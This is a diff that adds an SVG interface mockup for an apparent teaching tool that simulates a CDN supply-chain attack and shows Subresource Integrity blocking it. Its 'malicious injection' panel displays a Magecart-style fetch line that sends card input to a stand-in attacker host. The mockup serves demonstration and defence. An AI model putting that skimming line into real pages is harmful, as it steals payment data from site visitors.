@@ -1,0 +1,71 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 680" width="1200" height="680" style="background:#0a0d14; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
+  <defs>
+    <linearGradient id="bgGrad2" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#0a0d14"/>
+      <stop offset="100%" stop-color="#101622"/>
+    </linearGradient>
+    <filter id="shadow2" x="-5%" y="-5%" width="110%" height="110%">
+      <feDropShadow dx="0" dy="8" stdDeviation="12" flood-color="#000" flood-opacity="0.6"/>
+    </filter>
+  </defs>
+
+  <rect width="1200" height="680" fill="url(#bgGrad2)"/>
+
+  <!-- Top Bar -->
+  <rect width="1200" height="64" fill="#101622" stroke="#233047" stroke-width="1"/>
+  <text x="32" y="38" fill="#ffffff" font-size="18" font-weight="700">SRIForge Pro</text>
+  <text x="165" y="38" fill="#06b6d4" font-size="14" font-weight="600">— CDN Tamper &amp; Supply Chain Attack Simulator</text>
+
+  <!-- Left Form -->
+  <g transform="translate(32, 90)" filter="url(#shadow2)">
+    <rect width="550" height="550" rx="12" fill="#131b2b" stroke="#233047" stroke-width="1"/>
+    <text x="24" y="36" fill="#ffffff" font-size="16" font-weight="700">Simulate Supply Chain Attack</text>
+
+    <text x="24" y="75" fill="#94a3b8" font-size="12" font-weight="600">AUTHENTIC ASSET CODE</text>
+    <rect x="24" y="85" width="502" height="70" rx="6" fill="#172133" stroke="#233047"/>
+    <text x="36" y="110" fill="#f1f5f9" font-size="12" font-family="monospace">function initStripe() {</text>
+    <text x="48" y="130" fill="#f1f5f9" font-size="12" font-family="monospace">console.log("Stripe checkout loaded authentic");</text>
+    <text x="36" y="150" fill="#f1f5f9" font-size="12" font-family="monospace">}</text>
+
+    <text x="24" y="180" fill="#94a3b8" font-size="12" font-weight="600">MALICIOUS INJECTION (MAGECART / KEYLOGGER)</text>
+    <rect x="24" y="190" width="502" height="70" rx="6" fill="#172133" stroke="#233047"/>
+    <text x="36" y="215" fill="#f43f5e" font-size="12" font-family="monospace">/* Injected by CDN Attacker */</text>
+    <text x="36" y="235" fill="#f43f5e" font-size="12" font-family="monospace">fetch("https://evil-stealer.com/collect?cc=" + input.value);</text>
+
+    <rect x="24" y="285" width="18" height="18" rx="4" fill="#06b6d4"/>
+    <text x="28" y="299" fill="#04121d" font-size="12" font-weight="700">✓</text>
+    <text x="52" y="299" fill="#f1f5f9" font-size="13">Simulate CDN Compromise (Inject altered bytes into stream)</text>
+
+    <rect x="24" y="325" width="18" height="18" rx="4" fill="#06b6d4"/>
+    <text x="28" y="339" fill="#04121d" font-size="12" font-weight="700">✓</text>
+    <text x="52" y="339" fill="#f1f5f9" font-size="13">Enable CORS (crossorigin="anonymous" present)</text>
+
+    <rect x="24" y="380" width="502" height="42" rx="6" fill="#06b6d4"/>
+    <text x="275" y="406" fill="#04121d" font-size="14" font-weight="700" text-anchor="middle">Execute Browser Integrity Check</text>
+  </g>
+
+  <!-- Right Results -->
+  <g transform="translate(618, 90)" filter="url(#shadow2)">
+    <rect width="550" height="550" rx="12" fill="#131b2b" stroke="#233047" stroke-width="1"/>
+    <text x="24" y="36" fill="#ffffff" font-size="16" font-weight="700">Browser Enforcement Results</text>
+
+    <!-- Verdict Banner -->
+    <rect x="24" y="55" width="502" height="60" rx="8" fill="rgba(16, 185, 129, 0.15)" stroke="#10b981" stroke-width="1"/>
+    <text x="275" y="82" fill="#10b981" font-size="18" font-weight="800" text-anchor="middle">STATUS: BLOCKED</text>
+    <text x="275" y="102" fill="#10b981" font-size="12" text-anchor="middle">Subresource Integrity check failed! Browser refused to execute modified bytes.</text>
+
+    <text x="24" y="145" fill="#ffffff" font-size="13" font-weight="700">Technical Explanation:</text>
+    <rect x="24" y="155" width="502" height="65" rx="6" fill="#172133" stroke="#233047"/>
+    <text x="36" y="180" fill="#f1f5f9" font-size="12">Tampering detected! The CDN served modified bytes. The browser aborted script</text>
+    <text x="36" y="200" fill="#f1f5f9" font-size="12">execution before a single line of malicious code could run, preventing data exfiltration.</text>
+
+    <text x="24" y="245" fill="#ffffff" font-size="13" font-weight="700">Simulated Browser DevTools Console Error:</text>
+    <rect x="24" y="255" width="502" height="265" rx="6" fill="#080a10" stroke="#233047"/>
+    <text x="36" y="280" fill="#f43f5e" font-size="11" font-family="monospace">[Error] Failed to find a valid digest in the 'integrity'</text>
+    <text x="36" y="300" fill="#f43f5e" font-size="11" font-family="monospace">attribute for resource 'https://cdn.example.com/checkout.js'</text>
+    <text x="36" y="320" fill="#f43f5e" font-size="11" font-family="monospace">with computed checksum 'sha384-3hXX/cMPoQ3H0AR6...'.</text>
+    <text x="36" y="340" fill="#f43f5e" font-size="11" font-family="monospace">The resource has been blocked.</text>
+    <text x="36" y="375" fill="#94a3b8" font-size="11" font-family="monospace">[Security] Subresource Integrity verification failed.</text>
+    <text x="36" y="395" fill="#94a3b8" font-size="11" font-family="monospace">Execution aborted prior to script evaluation.</text>
+  </g>
+</svg>
